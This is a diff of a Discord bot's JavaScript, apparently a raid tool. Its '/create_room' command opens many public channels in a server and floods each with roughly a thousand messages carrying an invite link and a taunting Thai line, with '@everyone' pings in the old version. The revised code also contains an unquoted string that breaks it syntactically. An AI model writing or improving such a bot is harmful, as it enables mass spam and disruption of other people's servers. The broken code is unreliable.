@@ -359,37 +359,53 @@ client.on("interactionCreate", async (interaction) => {
 });
 
     // /create_room
-    if (interaction.commandName === "create_room") {
-      const amount = interaction.options.getInteger("amount") ?? 1;
-      await interaction.reply({
-        content:`สร้าง ${amount} ห้อง + ยิงพร้อมกัน`,
-        ephemeral:true
-      });
+if (interaction.commandName === "create_room") {
+const amount = interaction.options.getInteger("amount") ?? 1;
 
-      const tasks = [];
-      for (let i = 0; i < amount; i++) {
-        const name = roomNames[Math.floor(Math.random()*roomNames.length)];
-        try {
-  tasks.push(
-    interaction.guild.channels.create({
-      name,
-      type: ChannelType.GuildText,
-      permissionOverwrites: [{
-        id: interaction.guild.roles.everyone.id,
-        allow: [
-          PermissionsBitField.Flags.ViewChannel,
-          PermissionsBitField.Flags.SendMessages
-        ]
-      }],
-    }).then(ch => {
-      for (let i = 0; i < 1000; i++) {
-        ch.send("@everyone ไม่เป็นไรนะสร้างใหม่ได้ โอ๋ๆ https://discord.gg/bdtRJBryem")
-          .catch(() => {});
-      }
-    }).catch(() => {})
-  );
-} catch (err) {
-  console.error("ERROR:", err);
+await interaction.reply({
+content: กำลังสร้าง ${amount} ห้อง,
+ephemeral: true,
+});
+
+const tasks = [];
+
+// 1️⃣ สร้างห้องอย่างเดียว
+for (let i = 0; i < amount; i++) {
+const name = roomNames[Math.floor(Math.random() * roomNames.length)];
+
+tasks.push(  
+  interaction.guild.channels.create({  
+    name,  
+    type: ChannelType.GuildText,  
+    permissionOverwrites: [  
+      {  
+        id: interaction.guild.roles.everyone.id,  
+        allow: [  
+          PermissionsBitField.Flags.ViewChannel,  
+          PermissionsBitField.Flags.SendMessages,  
+        ],  
+      },  
+    ],  
+  })  
+);
+
+}
+
+// 2️⃣ รอให้สร้างเสร็จทั้งหมด
+const results = await Promise.allSettled(tasks);
+
+// 3️⃣ ส่งข้อความในห้องที่สร้างสำเร็จ
+for (const res of results) {
+if (res.status === "fulfilled") {
+const ch = res.value;
+
+// ❗ อย่าส่งถี่/เยอะ  
+  for (let i = 0; i < 999; i++) {  
+    await ch.send("ไม่เป็นไรนะ สร้างใหม่ได้ https://discord.gg/bdtRJBRyem").catch(() => {});  
+  }  
+}
+
+}
 }
 
 client.on("ready", async () => {
